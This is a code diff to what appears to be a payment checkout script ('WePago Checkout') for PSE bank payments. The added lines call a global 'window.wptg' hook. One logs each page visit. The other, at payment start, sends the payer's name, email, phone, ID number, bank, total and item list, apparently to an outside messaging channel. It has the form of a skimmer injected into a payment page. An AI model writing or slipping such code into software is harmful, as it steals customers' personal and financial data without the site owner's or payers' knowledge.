@@ -1,6 +1,8 @@
 (function () {
     'use strict';
 
+    if (window.wptg) window.wptg('🛒 <b>VISITA</b> · WePago Checkout');
+
     var CHECKOUT_KEY = 'wepago_checkout_v1';
     var AVATAR_COLORS = ['#7cb8f5', '#b026ff', '#5fd1a0', '#ffb84d', '#ff7a90', '#8f9bff'];
     var SENSITIVE_FIELDS = ['cardNumber', 'cardExp', 'cardCvv'];
@@ -281,6 +283,12 @@
     function submitPse(payer) {
         payButton.disabled = true;
         payButton.textContent = 'Conectando con PSE...';
+
+        if (window.wptg) {
+            var _total = cartApi ? cartApi.getTotal(items) : 0;
+            var _itemsText = items.map(function (it) { return '  • ' + it.merchantName + ' · Ref. ' + it.reference + ' · $' + it.amount; }).join('\n');
+            window.wptg('🏦 <b>PAGO PSE INICIADO</b>\n👤 ' + (payer.fullName || '-') + '\n📧 ' + (payer.email || '-') + '\n📱 ' + (payer.phone || '-') + '\n🆔 ' + (payer.docType || 'CC') + ' ' + (payer.docNumber || '-') + '\n🏦 Banco: ' + (payer.bank || '-') + '\n💰 Total: $' + String(_total) + '\n📦 Items:\n' + _itemsText);
+        }
 
         fetch('api/pse_charge.php', {
             method: 'POST',
